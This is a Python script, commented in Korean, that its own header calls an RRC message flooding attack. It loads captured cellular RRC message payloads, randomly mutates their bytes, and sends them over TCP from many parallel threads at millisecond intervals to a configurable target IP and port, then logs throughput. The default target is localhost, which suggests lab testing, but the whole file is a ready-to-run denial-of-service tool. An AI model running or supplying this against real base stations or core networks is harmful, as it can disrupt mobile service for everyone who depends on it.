#!/usr/bin/env python3
"""
RRC 메시지 Flooding 공격
캡처된 RRC 메시지를 기반으로 다수의 메시지를 전송합니다.
"""

import socket
import threading
import time
import json
import random
import argparse
from datetime import datetime

class RRCFloodingAttack:
    def __init__(self, target_ip="127.0.0.1", target_port=2001):
        self.target_ip = target_ip
        self.target_port = target_port
        self.running = False
        self.stats = {
            "total_sent": 0,
            "total_errors": 0,
            "start_time": None,
            "end_time": None
        }
        
    def load_rrc_messages(self, analysis_file):
        """분석 파일에서 RRC 메시지 로드"""
        try:
            with open(analysis_file, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            rrc_messages = data.get("rrc_messages", [])
            if not rrc_messages:
                print("RRC 메시지가 없습니다.")
                return None
            
            print(f"로드된 RRC 메시지 수: {len(rrc_messages)}")
            return rrc_messages
            
        except Exception as e:
            print(f"RRC 메시지 로드 오류: {e}")
            return None
    
    def generate_random_message(self, base_message):
        """기본 메시지를 기반으로 랜덤 메시지 생성"""
        try:
            # 16진수 페이로드 파싱
            payload_hex = base_message.get("payload", "")
            if not payload_hex:
                return None
            
            # 바이트 배열로 변환
            payload_bytes = bytes.fromhex(payload_hex)
            
            # 일부 바이트를 랜덤하게 변경 (UE ID 등)
            modified_bytes = bytearray(payload_bytes)
            
            # 랜덤 위치의 바이트 변경 (첫 번째와 마지막 바이트는 제외)
            if len(modified_bytes) > 2:
                for i in range(1, len(modified_bytes) - 1):
                    if random.random() < 0.3:  # 30% 확률로 변경
                        modified_bytes[i] = random.randint(0, 255)
            
            return modified_bytes
            
        except Exception as e:
            print(f"메시지 생성 오류: {e}")
            return None
    
    def send_message(self, message_bytes):
        """단일 메시지 전송"""
        try:
            # TCP 소켓 생성
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)  # 5초 타임아웃
            
            # 연결
            sock.connect((self.target_ip, self.target_port))
            
            # 메시지 전송
            bytes_sent = sock.send(message_bytes)
            
            # 응답 수신 (선택적)
            try:
                response = sock.recv(1024)
            except socket.timeout:
                response = b""
            
            sock.close()
            
            return bytes_sent, response
            
        except Exception as e:
            return 0, str(e)
    
    def flooding_thread(self, thread_id, messages, duration, interval=0.001, batch_size=1):
        """Flooding 스레드"""
        thread_stats = {"sent": 0, "errors": 0}
        start_time = time.time()
        
        print(f"[스레드 {thread_id}] 시작 (배치 크기: {batch_size})")
        
        while self.running and (time.time() - start_time) < duration:
            try:
                # 배치 크기만큼 메시지 생성 및 전송
                for _ in range(batch_size):
                    # 랜덤 메시지 선택
                    base_message = random.choice(messages)
                    
                    # 랜덤 메시지 생성
                    message_bytes = self.generate_random_message(base_message)
                    
                    if message_bytes:
                        # 메시지 전송
                        bytes_sent, response = self.send_message(message_bytes)
                        
                        if bytes_sent > 0:
                            thread_stats["sent"] += 1
                            self.stats["total_sent"] += 1
                        else:
                            thread_stats["errors"] += 1
                            self.stats["total_errors"] += 1
                
                # 간격 대기
                time.sleep(interval)
                
            except Exception as e:
                thread_stats["errors"] += 1
                self.stats["total_errors"] += 1
        
        print(f"[스레드 {thread_id}] 완료 - 전송: {thread_stats['sent']}, 오류: {thread_stats['errors']}")
    
    def start_flooding(self, messages, num_threads=10, duration=60, interval=0.001, batch_size=1):
        """Flooding 공격 시작"""
        if not messages:
            print("RRC 메시지가 없습니다.")
            return False
        
        print(f"=== RRC Flooding 공격 시작 ===")
        print(f"대상: {self.target_ip}:{self.target_port}")
        print(f"스레드 수: {num_threads}")
        print(f"지속 시간: {duration}초")
        print(f"메시지 간격: {interval}초")
        print(f"배치 크기: {batch_size}")
        print(f"사용할 RRC 메시지 수: {len(messages)}")
        print("=" * 50)
        
        self.running = True
        self.stats["start_time"] = datetime.now()
        
        # 스레드 생성 및 시작
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(
                target=self.flooding_thread,
                args=(i+1, messages, duration, interval, batch_size)
            )
            threads.append(thread)
            thread.start()
        
        # 진행 상황 출력
        start_time = time.time()
        while self.running and (time.time() - start_time) < duration:
            elapsed = time.time() - start_time
            remaining = duration - elapsed
            
            print(f"[{datetime.now().strftime('%H:%M:%S')}] 진행: {elapsed:.1f}초 / {duration}초 "
                  f"(남은 시간: {remaining:.1f}초) - 전송: {self.stats['total_sent']}, 오류: {self.stats['total_errors']}")
            
            time.sleep(10)  # 10초마다 상태 출력
        
        # 스레드 종료 대기
        self.running = False
        for thread in threads:
            thread.join()
        
        self.stats["end_time"] = datetime.now()
        
        return True
    
    def save_results(self):
        """결과 저장"""
        if not self.stats["start_time"]:
            return None
        
        duration = (self.stats["end_time"] - self.stats["start_time"]).total_seconds()
        messages_per_second = self.stats["total_sent"] / duration if duration > 0 else 0
        
        results = {
            "attack_info": {
                "target_ip": self.target_ip,
                "target_port": self.target_port,
                "num_threads": 10,  # 기본값
                "duration": duration,
                "timestamp": self.stats["start_time"].isoformat()
            },
            "results": {
                "total_messages": self.stats["total_sent"],
                "messages_per_second": messages_per_second,
                "errors": self.stats["total_errors"],
                "success_rate": (self.stats["total_sent"] / (self.stats["total_sent"] + self.stats["total_errors"]) * 100) if (self.stats["total_sent"] + self.stats["total_errors"]) > 0 else 0,
                "start_time": self.stats["start_time"].isoformat(),
                "end_time": self.stats["end_time"].isoformat()
            }
        }
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"flooding_results_{timestamp}.json"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                json.dump(results, f, indent=2, ensure_ascii=False)
            
            print(f"\n=== 공격 완료 ===")
            print(f"총 전송 메시지: {self.stats['total_sent']}")
            print(f"평균 전송 속도: {messages_per_second:.2f} msg/sec")
            print(f"오류 수: {self.stats['total_errors']}")
            print(f"시작 시간: {self.stats['start_time']}")
            print(f"종료 시간: {self.stats['end_time']}")
            print("=" * 50)
            print(f"결과 저장: {filename}")
            
            return filename
            
        except Exception as e:
            print(f"결과 저장 오류: {e}")
            return None

def main():
    """메인 함수"""
    parser = argparse.ArgumentParser(description="RRC 메시지 Flooding 공격")
    parser.add_argument("--target-ip", default="127.0.0.1", help="대상 IP 주소")
    parser.add_argument("--target-port", type=int, default=2001, help="대상 포트")
    parser.add_argument("--messages", required=True, help="RRC 메시지 분석 파일")
    parser.add_argument("--threads", type=int, default=10, help="스레드 수")
    parser.add_argument("--duration", type=int, default=60, help="지속 시간 (초)")
    parser.add_argument("--interval", type=float, default=0.001, help="메시지 간격 (초)")
    parser.add_argument("--batch-size", type=int, default=1, help="배치 크기 (한 번에 전송할 메시지 수)")
    
    args = parser.parse_args()
    
    # Flooding 공격 객체 생성
    attack = RRCFloodingAttack(args.target_ip, args.target_port)
    
    # RRC 메시지 로드
    messages = attack.load_rrc_messages(args.messages)
    if not messages:
        return
    
    try:
        # Flooding 공격 실행
        if attack.start_flooding(messages, args.threads, args.duration, args.interval, args.batch_size):
            # 결과 저장
            attack.save_results()
        else:
            print("Flooding 공격 실패")
            
    except KeyboardInterrupt:
        print(f"\n[{datetime.now().strftime('%H:%M:%S')}] 사용자에 의해 중단됨")
        attack.running = False
    except Exception as e:
        print(f"오류 발생: {e}")

if __name__ == "__main__":
    main()
